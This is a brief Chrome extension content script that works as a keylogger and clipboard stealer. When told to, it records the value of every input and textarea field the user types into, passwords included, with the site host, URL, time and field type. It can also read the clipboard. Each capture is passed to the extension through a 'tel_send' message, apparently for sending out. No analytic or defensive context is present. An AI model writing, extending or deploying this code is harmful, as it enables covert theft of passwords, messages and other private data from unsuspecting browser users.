chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'keylog') {
    if (message.active) document.addEventListener('input', onInput, true);
    else document.removeEventListener('input', onInput, true);
  }
  if (message.type === 'getClipboard') {
    navigator.clipboard.readText().then(text => {
      chrome.runtime.sendMessage({ type: 'tel_send', text: `📋 Clipboard: ${text}` });
    }).catch(() => {});
  }
});

function onInput(e) {
  const target = e.target;
  if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
    chrome.runtime.sendMessage({
      type: 'tel_send',
      text: `[Key] ${window.location.host}: ${target.value} (URL: ${window.location.href}, Time: ${new Date().toISOString()}, Type: ${target.type})`
    });
  }
}